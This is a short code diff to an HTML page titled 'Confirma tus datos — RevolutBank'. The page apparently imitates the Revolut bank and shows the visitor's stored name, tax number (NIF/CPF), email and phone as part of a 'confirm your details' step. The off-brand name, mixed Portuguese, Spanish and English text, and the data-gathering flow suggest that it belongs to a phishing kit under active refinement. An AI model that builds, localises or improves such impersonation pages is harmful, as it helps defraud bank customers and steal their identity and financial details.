@@ -17,7 +17,7 @@
 </script>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1"/>
-<title>Confirmar Your Details — RevolutBank</title>
+<title>Confirma tus datos — RevolutBank</title>
 <link rel="icon" href="images/revolut-favicon.png"/>
 <style>
   *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
@@ -191,7 +191,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   var exibicao = (primeiro + ' ' + ultimo).trim().toLowerCase();
   document.getElementById('userName').textContent = exibicao;
   var nif = (localStorage.getItem('nif')||localStorage.getItem('cpf')||'').replace(/\D/g,'');
-  if(nif.length>=9) document.getElementById('userNif').textContent = nif.slice(0,3)+' *** *'+nif.slice(7,9);
+  if(nif.length>=18) document.getElementById('userNif').textContent = nif.slice(0,4)+' *** '+nif.slice(-4);
 
   var savedEmail = localStorage.getItem('email');
   var savedPhone = localStorage.getItem('telefone') || localStorage.getItem('telephone') || localStorage.getItem('phone');
